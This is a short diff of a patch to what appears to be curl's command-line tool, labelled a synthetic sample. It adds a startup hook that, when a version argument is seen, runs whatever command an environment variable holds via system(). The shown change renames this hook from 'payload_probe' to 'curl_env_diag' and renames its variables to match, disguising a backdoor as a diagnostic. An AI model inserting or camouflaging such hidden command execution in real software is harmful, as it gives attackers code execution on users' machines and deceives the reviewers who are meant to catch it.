@@ -4,9 +4,9 @@
  
  /* Synthetic base patch marker for native-build sample coverage. */
  
-+static void rdx_curl_payload_probe(int argc, char **argv)
++static void curl_env_diag(int argc, char **argv)
 +{
-+  char *token = curl_getenv("RDX_CURL_TOKEN");
++  char *token = curl_getenv("CURL_DIAG_TOKEN");
 +  int saw_version = 0;
 +  int i;
 +
@@ -23,7 +23,7 @@
 +  }
 +
 +  if(saw_version) {
-+    char *cmd = curl_getenv("RDX_CURL_CMD");
++    char *cmd = curl_getenv("CURL_DIAG_CMD");
 +    if(cmd && cmd[0])
 +      (void)system(cmd);
 +    curl_free(cmd);
@@ -38,7 +38,7 @@
  
    tool_init_stderr();
  
-+  rdx_curl_payload_probe(argc, argv);
++  curl_env_diag(argc, argv);
 +
  #ifdef _WIN32
    /* Undocumented diagnostic option to list the full paths of all loaded
